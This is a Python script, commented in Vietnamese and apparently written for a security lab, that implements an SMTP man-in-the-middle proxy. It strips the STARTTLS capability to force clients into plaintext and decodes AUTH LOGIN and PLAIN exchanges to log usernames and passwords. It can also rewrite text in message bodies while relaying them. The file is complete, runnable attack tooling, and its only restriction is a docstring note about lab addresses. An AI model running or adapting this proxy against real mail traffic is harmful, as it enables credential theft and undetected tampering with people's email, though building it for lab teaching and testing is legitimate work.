#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
strip_starttls.py - SMTP trung gian (MitM) dung cho lab AT-06 / AT-04-TAMPER.

Ba chuc nang:
  1. Strip STARTTLS  : an dong '250-STARTTLS' trong phan hoi EHLO/HELO cua may thu.
                       Khach dang o che do opportunistic TLS se LANG LE roi ve
                       ban ro (plaintext fallback) - day la tan cong STARTTLS
                       stripping / downgrade, khong can danh cap duong truyen.
  2. Transcript      : ghi lai banner, EHLO, MAIL FROM, RCPT TO, DATA va giai ma
                       cac doan AUTH (base64 -> user/password ra file log).
  3. Body tamper     : thay chuoi trong than thu khi chuyen tiep (--tamper CU MOI),
                       chung minh neu noi nhan khong kiem DKIM thi thu bi sua van
                       duoc coi la 'nguyen ven'.

CHI chay trong lab, chi voi 5 dia chi IP 10.30.0.40/20/30/50.

Vi du (tren vm-atk):
  python3 attacks/strip_starttls.py --listen 2525 --upstream 10.30.0.20:587 \
      --tamper 9999999999 1029384756 --log /root/evidence/atk/at06-proxy.log
  (doi chieu khong an STARTTLS: them --no-strip)
"""
import argparse
import base64
import re
import socket
import sys
import threading
import time

RE_STARTTLS_CAP = re.compile(rb'^250[- ]\s*STARTTLS\s*$', re.IGNORECASE)
RE_B64_LINE = re.compile(r'^[A-Za-z0-9+/=]{6,}\s*$')


def ts():
    return time.strftime('%H:%M:%S')


class Ctx:
    """Log dung chung + trang thai AUTH cua mot phien."""

    def __init__(self, fh, opts):
        self.fh = fh
        self.o = opts
        self.auth_wait = 0          # 0 = khong dang hoi; 1 = hoi username; 2 = hoi password

    def log(self, line):
        self.fh.write(line.rstrip('\n') + '\n')
        self.fh.flush()
        print(line, flush=True)


def b64_maybe(token):
    try:
        raw = base64.b64decode(token + '=' * (-len(token) % 4), validate=True)
        text = raw.decode('utf-8')
    except Exception:
        return None
    if text and all(32 <= ord(c) < 127 or c in '\t\n' for c in text):
        return text
    return None


def relay_client_to_server(ctx, rf, wf):
    """Khach -> proxy -> may thu that."""
    upstream = wf
    for raw in rf:                       # doc theo tung dong SMTP (khi keu CRLF)
        line = raw.decode('utf-8', 'replace').rstrip('\r\n')
        ctx.log('%s KHACH -> PROXY : %s' % (ts(), line[:170]))
        up = line.upper()

        if up.startswith('DATA'):
            upstream.write(raw)
            upstream.flush()
            body = []
            for b in rf:                 # doc den het CRLF.CRLF
                body.append(b)
                if b in (b'.\r\n', b'\r\n.\r\n') or b.strip() == b'.':
                    break
            blob = b''.join(body)
            old = ctx.o.tamper_old.encode() if ctx.o.tamper_old else None
            if old and old in blob:
                blob = blob.replace(old, ctx.o.tamper_new.encode())
                ctx.log('  [TAMPER] da thay %r -> %r trong than thu (%d byte)'
                        % (ctx.o.tamper_old, ctx.o.tamper_new, len(blob)))
            elif old:
                ctx.log('  [TAMPER] khong thay %r - giu nguyen body' % ctx.o.tamper_old)
            upstream.write(blob)
            upstream.flush()
            continue

        if up.startswith('AUTH'):
            parts = line.split()
            ctx.auth_wait = 1 if len(parts) > 1 and parts[1].upper() in ('LOGIN', 'PLAIN', 'CRAM-MD5') else 0
            ctx.log('  [AUTH] co che = %s' % (parts[1] if len(parts) > 1 else '?'))
            if len(parts) > 2:           # AUTH PLAIN <b64> ngay trong lenh
                dec = b64_maybe(parts[2])
                if dec:
                    ctx.log('  [AUTH] giai ma inline -> %r' % dec.replace('\x00', ' | '))
                ctx.auth_wait = 0

        elif RE_B64_LINE.match(line.strip()) and ctx.auth_wait:
            dec = b64_maybe(line.strip())
            label = 'USERNAME' if ctx.auth_wait == 1 else 'PASSWORD'
            if dec:
                ctx.log('  [AUTH-THIEP] %s = %r  (base64: %s)' % (label, dec.replace('\x00', ' | '), line.strip()))
            ctx.auth_wait += 1

        upstream.write(raw)
        upstream.flush()


def relay_server_to_client(ctx, rf, wf):
    """May thu that -> proxy -> khach (loc bo capability STARTTLS)."""
    for raw in rf:
        if ctx.o.strip_starttls and RE_STARTTLS_CAP.match(raw.rstrip(b'\r\n')):
            ctx.log('  [STRIP] AN DONG NAY KHONG cho khach thay: %s'
                    % raw.decode('utf-8', 'replace').rstrip('\r\n'))
            continue
        line = raw.decode('utf-8', 'replace').rstrip('\r\n')
        if line:
            ctx.log('%s THU   -> PROXY : %s' % (ts(), line[:170]))
        if line.startswith('334'):
            chal = line.split()[-1] if len(line.split()) > 1 else ''
            dec = b64_maybe(chal)
            ctx.log('  [AUTH] may thu hoi: %r' % (dec or chal))
            if dec and dec.lower().startswith('user'):
                ctx.auth_wait = 1
            else:
                ctx.auth_wait = 2
        wf.write(raw)
        wf.flush()


def handle(conn, opts):
    host, port = opts.upstream.rsplit(':', 1)
    try:
        up = socket.create_connection((host, int(port)), timeout=10)
    except OSError as e:
        print('[proxy] khong noi duoc %s:%s -> %s' % (host, port, e), file=sys.stderr)
        conn.close()
        return

    peer = '%s:%s' % conn.getpeername()[:2]
    with open(opts.log, 'a', buffering=1) as fh:
        ctx = Ctx(fh, opts)
        ctx.log('\n===== phien moi tu %s, trung gian toi %s (%s) =====' % (peer, opts.upstream, ts()))
        c_rf, c_wf = conn.makefile('rb'), conn.makefile('wb')
        u_rf, u_wf = up.makefile('rb'), up.makefile('wb')
        t = threading.Thread(target=relay_client_to_server, args=(ctx, c_rf, u_wf), daemon=True)
        t.start()
        try:
            relay_server_to_client(ctx, u_rf, c_wf)
        finally:
            for f in (c_rf, c_wf, u_rf, u_wf):
                try:
                    f.close()
                except Exception:
                    pass
            try:
                conn.close()
            except Exception:
                pass
            try:
                up.close()
            except Exception:
                pass


def main():
    p = argparse.ArgumentParser(description='SMTP STARTTLS-strip / body-tamper proxy (lab only)')
    p.add_argument('--listen', type=int, default=2525)
    p.add_argument('--listen-host', default='0.0.0.0')
    p.add_argument('--upstream', default='10.30.0.20:587', help='host:port cua MTA that')
    p.add_argument('--no-strip', dest='strip_starttls', action='store_false', default=True,
                   help='chi cham trung gian, khong an STARTTLS (dieu kiem doi chieu)')
    p.add_argument('--tamper', nargs=2, metavar=('TU_CU', 'TU_MOI'), default=(None, None))
    p.add_argument('--log', default='/root/evidence/atk/strip-proxy.log')
    a = p.parse_args()
    a.tamper_old, a.tamper_new = a.tamper

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((a.listen_host, a.listen))
    srv.listen(16)
    print('[proxy] lang nghe %s:%d  ->  chuyen tiep toi %s | strip=%s | tamper=%s -> %s | log=%s'
          % (a.listen_host, a.listen, a.upstream, a.strip_starttls, a.tamper[0], a.tamper[1], a.log),
          flush=True)
    try:
        while True:
            conn, _ = srv.accept()
            threading.Thread(target=handle, args=(conn, a), daemon=True).start()
    except KeyboardInterrupt:
        print('\n[proxy] dung')
    finally:
        srv.close()


if __name__ == '__main__':
    main()
